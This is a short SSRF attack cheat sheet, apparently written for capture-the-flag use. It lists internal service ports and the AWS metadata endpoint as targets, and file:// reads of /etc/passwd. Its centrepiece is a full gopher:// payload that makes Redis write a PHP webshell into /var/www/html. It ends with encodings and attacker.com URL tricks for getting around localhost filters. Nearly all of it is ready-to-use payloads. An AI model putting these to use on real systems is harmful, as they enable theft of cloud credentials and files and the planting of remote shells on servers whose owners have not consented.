# Server-Side Request Forgery (SSRF)

## Detection
- Any parameter that accepts a URL or hostname
- Image fetch features, webhooks, URL preview, PDF generators
- Try: `http://127.0.0.1`, `http://localhost`, `http://[::1]`

## Internal Service Discovery
```
http://127.0.0.1:80
http://127.0.0.1:8080
http://127.0.0.1:3000
http://127.0.0.1:6379    (Redis)
http://127.0.0.1:27017   (MongoDB)
http://127.0.0.1:9200    (Elasticsearch)
http://169.254.169.254/latest/meta-data/  (AWS metadata)
```

## Protocol Smuggling
```
# File protocol
file:///etc/passwd
file:///flag

# Gopher protocol (Redis exploit)
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$34%0d%0a%0a%0a<%3fphp%20system('cat /flag')%3b%3f>%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0asave%0d%0a

# Dict protocol
dict://127.0.0.1:6379/info
```

## Bypass Filters
```
# IP alternatives for 127.0.0.1
http://0x7f000001
http://2130706433
http://017700000001
http://0177.0.0.1
http://127.1
http://0.0.0.0
http://[::1]
http://[0:0:0:0:0:ffff:127.0.0.1]

# DNS rebinding
Use a domain that resolves to 127.0.0.1

# URL tricks
http://attacker.com@127.0.0.1
http://127.0.0.1#@attacker.com
http://127.0.0.1%00@attacker.com
```
